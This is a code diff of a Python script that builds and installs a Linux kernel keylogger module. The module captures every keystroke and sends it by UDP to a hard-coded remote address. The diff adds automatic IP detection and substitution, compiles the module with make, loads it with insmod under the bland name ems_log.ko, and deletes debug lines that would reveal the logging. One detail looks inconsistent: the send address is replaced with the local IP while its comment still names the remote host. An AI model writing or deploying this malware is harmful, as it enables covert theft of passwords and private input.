@@ -1,7 +1,26 @@
 #!/usr/bin/python
 from commands import getoutput
+import socket
+import fcntl
+import struct
 
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,  # SIOCGIFADDR
+        struct.pack('256s', ifname[:15])
+    )[20:24])
 
+def ip_addr_to_hex_str(ip):
+    parts = ip.split(".")
+    hex_str = "0x"
+    for part in parts:
+        hex_str += hex(int(part)).replace("0x", "")
+    return hex_str
+
+local_ip = ip_addr_to_hex_str(get_ip_address("eth0"))
+print("INSTALLING WITH LOCAL IP ADDRESS OF %s" % local_ip)
 
 src = """#include <linux/module.h>
 #include <linux/kernel.h>
@@ -28,13 +47,12 @@ static struct notifier_block nb;
 // you'll have to replace this with the hex of the ip for the computer you're adding this
 // module to
 #define INADDR_LOCAL ((unsigned long int)0x0A600634) // 10.96.6.43
-#define INADDR_SEND ((unsigned long int)0x4A76164B) // 74.118.22.75 (isoptera.lcsc.edu)
+#define INADDR_SEND ((unsigned long int)%s) // 74.118.22.75 (isoptera.lcsc.edu)
 
 static void send_msg(char *msg, size_t size)
 {
 		if(kl_buffer[0] != '\0') {
 			netpoll_send_udp(np, msg, size);
-//			printk(KERN_INFO "Successfully sent off: %s\n", msg);
 		}
 }
 
@@ -86,7 +104,6 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
 			  
 	if (code == KBD_KEYCODE) {
 		scancode = param->value;
-//		printk(KERN_DEBUG "KEYLOGGER %x %s\n", param->value, (param->down ? "down" : "up"));
 		if(!param->down) {
 			scancode += 0x80;
 		}
@@ -112,7 +129,6 @@ static int __init init_keylogger(void)
 	register_keyboard_notifier(&nb);
 //	proc_create(PROC_FILE_NAME, 0, NULL, &proc_fops);
 	setup_netpoll();
-//	send_msg("hi", 2);
 	return 0;
 }
 
@@ -124,4 +140,13 @@ static void __exit exit_keylogger(void)
 
 module_init(init_keylogger);
 module_exit(exit_keylogger);
-MODULE_LICENSE ("GPL");"""
+MODULE_LICENSE ("GPL");""" % local_ip
+
+with open("keylogger.c", "w") as src_f:
+    src_f.write(src)
+
+resp = getoutput("make")
+resp = getoutput("insmod ems_log.ko")
+if(len(resp) > 0):
+    print("AN ERROR OCCURRED: %s" % resp)
+
